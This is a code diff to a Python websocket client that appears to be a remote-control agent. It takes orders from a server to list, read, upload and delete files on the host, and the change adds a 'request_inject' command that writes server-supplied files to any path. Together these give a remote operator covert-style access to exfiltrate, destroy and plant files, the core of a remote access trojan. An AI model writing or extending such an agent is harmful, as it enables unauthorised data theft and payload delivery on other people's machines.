@@ -3,7 +3,7 @@ import json
 
 import websockets
 
-from filesystem import list_directory, read_file_base64, delete_path
+from filesystem import list_directory, read_file_base64, delete_path, write_file
 from ssl_utils import build_ssl_context
 from system_info import (
     get_device_id,
@@ -130,6 +130,27 @@ async def run(url: str) -> None:
                                 print(f">> deleted {target_path} (request {data.get('request_id')})")
                             else:
                                 print(f">> delete failed for {target_path}: {result.get('error')} (request {data.get('request_id')})")
+
+                        elif data.get("type") == "request_inject":
+                            inject_path = data.get("path", "")
+                            file_name = data.get("file_name", "")
+                            file_data = data.get("file_data", "")
+                            result = write_file(inject_path, file_name, file_data)
+                            response = {
+                                "type": "inject_response",
+                                "data": {
+                                    "request_id": data.get("request_id"),
+                                    "path": inject_path,
+                                    "file_name": file_name,
+                                    "success": result.get("success", False),
+                                    "error": result.get("error"),
+                                },
+                            }
+                            await ws.send(json.dumps(response))
+                            if result.get("success"):
+                                print(f">> injected {file_name} to {inject_path} (request {data.get('request_id')})")
+                            else:
+                                print(f">> inject failed for {file_name} at {inject_path}: {result.get('error')} (request {data.get('request_id')})")
 
                 await asyncio.gather(heartbeat(), listen())
 
